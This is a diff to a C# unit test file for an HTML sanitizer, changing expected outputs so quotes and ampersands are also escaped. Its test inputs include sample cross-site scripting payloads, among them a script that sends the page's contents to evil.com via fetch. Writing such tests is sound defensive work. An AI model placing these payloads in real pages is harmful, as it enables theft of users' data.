@@ -47,7 +47,7 @@ public class HtmlSanitizerTests
     {
         const string input = "<script>alert('xss')</script>";
         var result = HtmlSanitizer.Sanitize(input);
-        Assert.Equal("&lt;script&gt;alert('xss')&lt;/script&gt;", result);
+        Assert.Equal("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;", result);
     }
 
     [Fact]
@@ -55,7 +55,7 @@ public class HtmlSanitizerTests
     {
         const string input = "<div class='danger'>Content</div>";
         var result = HtmlSanitizer.Sanitize(input);
-        Assert.Equal("&lt;div class='danger'&gt;Content&lt;/div&gt;", result);
+        Assert.Equal("&lt;div class=&#39;danger&#39;&gt;Content&lt;/div&gt;", result);
     }
 
     [Fact]
@@ -130,8 +130,7 @@ public class HtmlSanitizerTests
     {
         const string input = "if (x > 5 && y < 10) { }";
         var result = HtmlSanitizer.Sanitize(input);
-        // HtmlSanitizer only escapes < and > to prevent HTML injection, not other characters
-        Assert.Equal("if (x &gt; 5 && y &lt; 10) { }", result);
+        Assert.Equal("if (x &gt; 5 &amp;&amp; y &lt; 10) { }", result);
     }
 
     [Fact]
@@ -139,7 +138,7 @@ public class HtmlSanitizerTests
     {
         const string input = "<iframe src='malicious.html'></iframe>";
         var result = HtmlSanitizer.Sanitize(input);
-        Assert.Equal("&lt;iframe src='malicious.html'&gt;&lt;/iframe&gt;", result);
+        Assert.Equal("&lt;iframe src=&#39;malicious.html&#39;&gt;&lt;/iframe&gt;", result);
     }
 
     [Fact]
@@ -163,7 +162,7 @@ public class HtmlSanitizerTests
             "Check this review: <script>fetch('http://evil.com?data=' + document.body.innerHTML)</script>";
         var result = HtmlSanitizer.Sanitize(input);
         Assert.Equal(
-            "Check this review: &lt;script&gt;fetch('http://evil.com?data=' + document.body.innerHTML)&lt;/script&gt;",
+            "Check this review: &lt;script&gt;fetch(&#39;http://evil.com?data=&#39; + document.body.innerHTML)&lt;/script&gt;",
             result);
     }
 
@@ -200,9 +199,6 @@ public class HtmlSanitizerTests
             2. Generic constraint issue with `Foo<T>`
             """;
         var result = HtmlSanitizer.Sanitize(input);
-        // Note: Angle brackets are escaped even inside backticks for maximum safety.
-        // The markdown rendering will still preserve the backticks and format correctly,
-        // while preventing any HTML injection via those characters.
         Assert.Contains("&lt;T&gt;", result);
         Assert.DoesNotContain("<T>", result);
     }
@@ -220,6 +216,6 @@ public class HtmlSanitizerTests
     {
         const string input = """<img src="test.jpg" alt="bad<>quotes">""";
         var result = HtmlSanitizer.Sanitize(input);
-        Assert.Equal("""&lt;img src="test.jpg" alt="bad&lt;&gt;quotes"&gt;""", result);
+        Assert.Equal("&lt;img src=&quot;test.jpg&quot; alt=&quot;bad&lt;&gt;quotes&quot;&gt;", result);
     }
 }
